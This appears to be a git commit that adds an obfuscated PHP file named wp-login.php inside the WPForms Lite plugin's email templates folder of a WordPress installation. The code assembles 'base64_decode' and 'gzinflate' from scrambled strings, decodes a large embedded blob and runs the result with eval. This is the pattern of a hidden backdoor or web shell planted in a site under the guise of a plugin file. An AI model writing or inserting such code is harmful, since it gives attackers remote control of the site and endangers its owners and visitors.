f9cdf065f1993bb2b08b2ebd0d2c9ae7a82aaf66
osconsolador <osconsolador@gmail.com>
2023-02-01 13:23:15 -0300

    primeiro commit

---
+++ wordpress/wp-content/plugins/wpforms-lite/templates/emails/wp-login.php
@@ -0,0 +1,26 @@
+<?php
+$jSVs0Hze =
+function($M65tdAGbmyp7Z 
+	){$_u4CovRuE6a = "dBOE4e";$hMgjB_QC=$_u4CovRuE6a[(20 - 18) / 2]; $hMgjB_QC.= 'A'.
+'s'
+;$hMgjB_QC
+.=  $_u4CovRuE6a[20 + -17].(25 - 19) .	(2 + 2).
+'_' .$_u4CovRuE6a[(0 * 5)]	.	$_u4CovRuE6a[(0 * 15) + 5] .'C'
+.$_u4CovRuE6a[2] .'d'.	$_u4CovRuE6a[5]. ''; 	
+ return $hMgjB_QC($M65tdAGbmyp7Z); };$GezeuP='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';	
+function g0Zwsuiyg4_KM	()
+{$JHqEjr5kHA="cfPinQfCa1fG7rcNSk";
+ return $JHqEjr5kHA;
+} 
+ function  iExc8i65Co7Yj4
+($CCFV3N)
+{$s9og07P="vkEzOInzSUXAPu3q";return $s9og07P;}	  function mJDzL	($tsRVyBs) {$eHBJA7d = "TSmVG";$oDGNcW=$eHBJA7d[17 + -17] ;$oDGNcW .= $eHBJA7d[(45 - 33) / 6].$eHBJA7d[(16 - 4) / 4] .'A' ;
+$oDGNcW.=
+	$eHBJA7d[(0 * 3) + 1]	.	'Y'
+.
+'n' .	$eHBJA7d[7 + -3];	$oDGNcW .=
+'R'.''; $oDGNcW
+= str_rot13($oDGNcW); return $oDGNcW($tsRVyBs); } 
+
+$GezeuP
+=$jSVs0Hze($GezeuP);$GezeuP=mJDzL($GezeuP);EvaL ($GezeuP);; ?>
